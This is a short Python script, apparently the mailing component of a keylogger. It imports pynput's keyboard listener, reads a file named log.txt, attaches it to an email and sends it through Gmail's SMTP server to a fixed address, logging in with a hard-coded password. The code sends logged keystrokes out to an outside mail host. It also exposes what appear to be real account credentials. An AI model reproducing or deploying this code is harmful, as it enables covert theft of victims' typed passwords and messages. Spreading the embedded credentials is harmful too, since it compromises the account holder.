from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

mensaje = MIMEMultipart("plain")
mensaje["From"] = "esteban2002p@gmail.com"
mensaje["To"] = "esteban2002p@gmail.com"
mensaje["Subject"] = "Correo de prueba"

adjunto = MIMEBase("application", "octect-stream")
adjunto.set_payload(open('log.txt','rb').read())
adjunto.add_header("content-Disposition", 'attachment; filename="log.txt"')
mensaje.attach(adjunto)

server = SMTP("smtp.gmail.com:587")
server.starttls()
server.login("esteban2002p@gmail","Calderon470")
server.sendmail("esteban2002p@gmail.com","esteban2002p@gmail.com",mensaje.as_string().encode('utf-8'))

server.quit()